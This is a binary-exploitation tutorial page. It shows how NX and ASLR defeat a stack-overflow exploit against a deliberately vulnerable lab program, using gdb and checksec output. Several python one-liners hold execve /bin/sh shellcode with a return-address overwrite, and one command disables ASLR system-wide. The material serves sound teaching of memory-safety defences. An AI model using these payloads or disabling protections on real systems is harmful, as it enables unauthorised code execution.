# Security techniques

Security techniques were invented to prevent exploitation of the programs. Each of them is aimed at concrete vulnerability. In general, these techniques are just compiler options or OS configuration.

## Non-Executable Stack(NX)

Prevents the attacker from jumping to the shellcode within the stack by disabling execution of the stack. I disabled it before with an option of the compiler: `-z execstack`. Thus, it makes the stack executable or, in other words, it allows you to execute the content of the stack.

Let's try our stack-overflow exploit that we did before.

Firstly, start the exploit without the NX option:
```bash
$ checksec stack-overflow
[*] '/home/shogun/repos/basics-of-pwn/content/stack-overflow/stack-overflow'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
$ python3 exploit.py
[+] Starting local process './stack-overflow': pid 6803
[*] Switching to interactive mode
$ w
19:56:08 up 28 min,  1 user,  load average: 0.47, 0.65, 0.60
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
shogun   tty7     :0               19:27   28:37   1:25   1.39s xfce4-session
$  
```

Exploit works.

Now, try it with NX enabled:
```bash
$ gcc ../stack-overflow/stack-overflow.c -o stack-overflow-with-nx -fno-stack-protector -no-pie
$ checksec stack-overflow-with-nx
[*] '/home/shogun/repos/basics-of-pwn/content/security-techniques/stack-overflow-with-nx'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$ cp ../stack-overflow/exploit.py stack-overflow-exploit.py
$ python3 stack-overflow-exploit.py
[+] Starting local process './stack-overflow-with-nx': pid 7040
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$ w
[*] Process './stack-overflow-with-nx' stopped with exit code -11 (SIGSEGV) (pid 7040)
[*] Got EOF while sending in interactive
```

Okay, you can see that the NX option is enabled as `checksec` said. And exploit is broken. Let's try without script:
```bash
$ (python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*239 + "\x36\xcf\xff\xff"'; cat) | ./stack-overflow-with-nx

Segmentation fault (core dumped)
```

Okay, the program just crashed.

In gdb:
```bash
gef➤  unset environment LINES
gef➤  unset environment COLUMNS
gef➤  r < <(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*239 + "\x36\xcf\xff\xff"')
Starting program: /home/shogun/repos/basics-of-pwn/content/security-techniques/stack-overflow-with-nx < <(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*239 + "\x36\xcf\xff\xff"')

Program received signal SIGSEGV, Segmentation fault.
0xffffcf36 in ?? ()
gef➤  x/100wx $esp - 0x12a
0xffffcea6:	0xcfc8f7fa	0x923affff	0xcec60804	0xcf00ffff
0xffffceb6:	0x0003ffff	0x92240000	0xd0000804	0xe76cf7ff
0xffffcec6:	0x6850c031	0x68732f2f	0x69622f68	0x50e3896e
0xffffced6:	0xb0e18953	0x4180cd0b	0x41414141	0x41414141
0xffffcee6:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcef6:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf06:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf16:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf26:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf36:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf46:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf56:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf66:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf76:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf86:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf96:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcfa6:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcfb6:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcfc6:	0x41414141	0xcf364141	0x8000ffff	0x8000f7fa
0xffffcfd6:	0x0000f7fa	0xbee50000	0x0001f7dd	0xd0740000
0xffffcfe6:	0xd07cffff	0xd004ffff	0x8000ffff	0x0000f7fa
0xffffcff6:	0xd0580000	0x0000ffff	0xd0000000	0x0000f7ff
0xffffd006:	0x80000000	0x8000f7fa	0x0000f7fa	0x1c800000
0xffffd016:	0x9a909e20	0x0000dac2	0x00000000	0x00000000
0xffffd026:	0x00010000	0x90c00000	0x00000804	0x7cd40000
gef➤  r < <(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*239 + "\xc6\xce\xff\xff"')
Starting program: /home/shogun/repos/basics-of-pwn/content/security-techniques/stack-overflow-with-nx < <(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*239 + "\xc6\xce\xff\xff"')

Program received signal SIGSEGV, Segmentation fault.
0xffffcec6 in ?? ()
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start      End        Offset     Perm Path
0x08048000 0x08049000 0x00000000 r-- /home/shogun/repos/basics-of-pwn/content/security-techniques/stack-overflow-with-nx
0x08049000 0x0804a000 0x00001000 r-x /home/shogun/repos/basics-of-pwn/content/security-techniques/stack-overflow-with-nx
0x0804a000 0x0804b000 0x00002000 r-- /home/shogun/repos/basics-of-pwn/content/security-techniques/stack-overflow-with-nx
0x0804b000 0x0804c000 0x00002000 r-- /home/shogun/repos/basics-of-pwn/content/security-techniques/stack-overflow-with-nx
0x0804c000 0x0804d000 0x00003000 rw- /home/shogun/repos/basics-of-pwn/content/security-techniques/stack-overflow-with-nx
0x0804d000 0x0806f000 0x00000000 rw- [heap]
0xf7dbd000 0xf7dda000 0x00000000 r-- /lib/i386-linux-gnu/libc-2.31.so
0xf7dda000 0xf7f35000 0x0001d000 r-x /lib/i386-linux-gnu/libc-2.31.so
0xf7f35000 0xf7fa5000 0x00178000 r-- /lib/i386-linux-gnu/libc-2.31.so
0xf7fa5000 0xf7fa6000 0x001e8000 --- /lib/i386-linux-gnu/libc-2.31.so
0xf7fa6000 0xf7fa8000 0x001e8000 r-- /lib/i386-linux-gnu/libc-2.31.so
0xf7fa8000 0xf7faa000 0x001ea000 rw- /lib/i386-linux-gnu/libc-2.31.so
0xf7faa000 0xf7fac000 0x00000000 rw-
0xf7fcb000 0xf7fcd000 0x00000000 rw-
0xf7fcd000 0xf7fd0000 0x00000000 r-- [vvar]
0xf7fd0000 0xf7fd1000 0x00000000 r-x [vdso]
0xf7fd1000 0xf7fd2000 0x00000000 r-- /lib/i386-linux-gnu/ld-2.31.so
0xf7fd2000 0xf7ff0000 0x00001000 r-x /lib/i386-linux-gnu/ld-2.31.so
0xf7ff0000 0xf7ffb000 0x0001f000 r-- /lib/i386-linux-gnu/ld-2.31.so
0xf7ffc000 0xf7ffd000 0x0002a000 r-- /lib/i386-linux-gnu/ld-2.31.so
0xf7ffd000 0xf7ffe000 0x0002b000 rw- /lib/i386-linux-gnu/ld-2.31.so
0xfffdd000 0xffffe000 0x00000000 rw- [stack]
```

Even, if you will jump to the right address the program will not execute it, because you can see that the stack hasn't an X flag.

But, it doesn't mean that you can't exploit it now. You can apply two exploitation techniques here: [Return to libc attack(ret2libc)](../bypass-security-techniques/bypass-security-techniques.md#return-to-libc-attack "https://github.com/whatsyourask/basics-of-pwn/blob/main/content/bypass-security-techniques/bypass-security-techniques.md#return-to-libc-attack") and `Return-Oriented programming(ROP)`.


## Address Space Layout Randomization(ASLR)

Prevents the attacker from jumping to the shellcode wherever by randomize the address space of a process. So, if you want to jump to concrete address, for example, `0xffffcfdd`, you can't do it directly, because every time you execute the program, its address space changes. I disabled it before with `echo "0" | sudo dd of=/proc/sys/kernel/randomize_va_space`. Also, it makes difficult to use `ret2libc attack`, because in this attack, you need to locate needed functions and with ASLR they will have random addresses.  

Let's again try stack-overflow exploit.

```bash
$ sudo cat /proc/sys/kernel/randomize_va_space              
2
```

2 indicates that ASLR is enabled.

```bash
gef➤  unset environment LINES
gef➤  unset environment COLUMNS
gef➤  r < <(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 239 + "\xda\xce\xff\xff"')
Starting program: /home/shogun/repos/basics-of-pwn/content/security-techniques/stack-overflow-for-aslr < <(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 239 + "\xda\xce\xff\xff"')

Program received signal SIGILL, Illegal instruction.
0xffffcfd6 in ?? ()
gef➤  x/100wx $esp - 0x10e
0xffffcec6:	0x0003ffff	0x92240000	0xd0000804	0xd76cf7ff
0xffffced6:	0x6850c031	0x68732f2f	0x69622f68	0x50e3896e
0xffffcee6:	0xb0e18953	0x4180cd0b	0x41414141	0x41414141
0xffffcef6:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf06:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf16:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf26:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf36:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf46:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf56:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf66:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf76:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf86:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf96:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcfa6:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcfb6:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcfc6:	0x41414141	0x41414141	0x41414141	0xcfdc4141
0xffffcfd6:	0xce16ffff	0x622fffff	0x70006e69	0x7000f7fa
0xffffcfe6:	0x0000f7fa	0xaee50000	0x0001f7dd	0xd0840000
0xffffcff6:	0xd08cffff	0xd014ffff	0x7000ffff	0x0000f7fa
0xffffd006:	0xd0680000	0x0000ffff	0xd0000000	0x0000f7ff
0xffffd016:	0x70000000	0x7000f7fa	0x0000f7fa	0x93dd0000
0xffffd026:	0x35cd4860	0x00000ca2	0x00000000	0x00000000
0xffffd036:	0x00010000	0x90c00000	0x00000804	0x7cd40000
0xffffd046:	0x2410f7fe	0xc000f7fe	0x00010804	0x90c00000
gef➤  
```

Okay, try to change the return address:
```bash
gef➤  unset environment LINES
gef➤  unset environment COLUMNS
gef➤  r < <(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 239 + "\xd6\xce\xff\xff"')
Starting program: /home/shogun/repos/basics-of-pwn/content/security-techniques/stack-overflow-for-aslr < <(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 239 + "\xd6\xce\xff\xff"')
process 58805 is executing new program: /bin/dash
[Inferior 1 (process 58805) exited normally]
gef➤  
```

Now, try it outside gdb with ltrace to see the addresses.
```bash
$ (python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 239 + "\xda\xce\xff\xff"'; cat) | ltrace ./stack-overflow-for-aslr
__libc_start_main(0x8049243, 1, 0xff9226f4, 0x8049270 <unfinished ...>
gets(0xff922546, 0xff922580, 3, 0x8049224)                         = 0xff922546
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
w
$ (python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 239 + "\xda\xce\xff\xff"'; cat) | ltrace ./stack-overflow-for-aslr
__libc_start_main(0x8049243, 1, 0xffc80924, 0x8049270 <unfinished ...>
gets(0xffc80776, 0xffc807b0, 3, 0x8049224)                         = 0xffc80776
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
w
$ (python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 239 + "\xda\xce\xff\xff"'; cat) | ltrace ./stack-overflow-for-aslr w
__libc_start_main(0x8049243, 2, 0xffaa87a4, 0x8049270 <unfinished ...>
gets(0xffaa85f6, 0xffaa8630, 3, 0x8049224)                         = 0xffaa85f6
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
w
```

Each time I run the program ltrace showed different address. python script with ret2libc attack won't work too.
